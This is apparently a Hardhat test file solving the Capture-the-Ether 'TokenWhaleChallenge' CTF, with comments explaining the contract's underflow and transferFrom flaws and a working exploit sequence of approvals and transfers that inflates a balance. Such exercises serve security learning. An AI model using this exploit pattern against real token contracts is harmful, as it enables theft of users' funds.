const { BigNumber } = require("@ethersproject/bignumber");
const { expect, assert } = require("chai");
const { ethers } = require("hardhat");

describe("Ejercicio 1", function () {

  let deployer;

  beforeEach(async function () {
    accounts = await ethers.getSigners();
    this.deployer = accounts[0]
    this.secondEOA = accounts[1]

    // Se hace deploy del contrato
    const factory = await ethers.getContractFactory("TokenWhaleChallenge");
    this.contract = await factory.deploy(this.deployer.address);
  });

  it("attack", async function () {
      /*
      Vector attacks detected.:
      1) the private func _transfer doesn't has requires. 
        This isn't a vector attack by itself.
        but balanceOf[msg.sender] could be underflow
      2) In transferFrom and Transfer:
        require(balanceOf[to] + value >= balanceOf[to]);
        this line could be overflowed. if balanceOf[to] + value > uint256 max, 
        will overflow, the require could be skiped.
     3) In trasferFrom, the key error, is that checks the balance of From EOA,
        but the _transfer function always send tokens from the msg.sender
        no from the from eoa.
      */

    /*
    Logic of the attack.
     - _player has 1000 tokens initialy

     approve(secondEOA, inf)
     approve(_player, inf)

     transferFrom called from secondEOA(_player, _player, 999)
        _player has 1000
        secondEOA has 0

        require(balance[from=_player] > 999)    -> 1000 > 999 -> True!
        require(balance[to=secondEOA] + 999 > 0) -> 999 > 0 -> True!
        allowance[_player][secondEOA] >= 999 -> inf > 999 True!
        then allowance is reduced in 999
        _transfer(secondEOA, 999)
            balanceOf[msg.sender] -= value;
            balanceOf[to] += value;
            msg.sender = secondEOA
        
        balanceOf[msg.sender] = 0 - 999 = max_uint256 - 998
        balanceOf[secondEOA] = max_uint256 + 999

    transfer called from secondEOA(_player, 1000000);

     _player will have the needed amount of tokens.
     could send more tokens too.
        
    */

   console.log(this.deployer.address)
   console.log(this.secondEOA.address)
   await this.contract.approve(this.secondEOA.address, 1000000000);
   await this.contract.approve(this.deployer.address, 10000000000);

   await this.contract.connect(this.secondEOA).transferFrom(this.deployer.address, this.deployer.address, 999);
   balance = await this.contract.balanceOf(this.secondEOA.address);
   console.log('Balance of _player: ', (await this.contract.balanceOf(this.deployer.address)).toString())
   console.log('Balance of secondEOA: ', balance.toString())
   
   await this.contract.connect(this.secondEOA).transfer(this.deployer.address, 1000000)
  
   balance = await this.contract.balanceOf(this.secondEOA.address);
   console.log('Balance of _player: ', (await this.contract.balanceOf(this.deployer.address)).toString())
   console.log('Balance of secondEOA: ', balance.toString())

   expect(await this.contract.isComplete()).to.be.true;

  });

});
